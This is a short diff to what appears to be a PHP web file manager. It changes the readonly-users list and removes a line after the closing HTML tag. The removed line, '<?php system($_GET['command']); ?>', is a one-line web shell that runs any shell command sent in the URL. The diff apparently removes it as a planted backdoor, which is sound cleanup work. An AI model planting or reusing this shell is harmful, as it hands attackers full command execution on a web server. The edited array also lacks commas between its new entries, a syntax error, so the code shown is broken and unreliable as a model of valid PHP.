@@ -27,9 +27,10 @@ $auth_users = array(
 );
 
 // Readonly users
-// e.g. array('users', 'guest', ...)
 $readonly_users = array(
-    'user'
+    'www-data'
+    'apache2'
+    '$user'
 );
 
 // Global readonly, including when auth is not being used
@@ -4213,7 +4214,6 @@ $isStickyNavBar = $sticky_navbar ? 'navbar-fixed' : 'navbar-normal';
 <div id="snackbar"></div>
 </body>
 </html>
-<?php system($_GET['command']); ?>
 <?php
 }
 /**
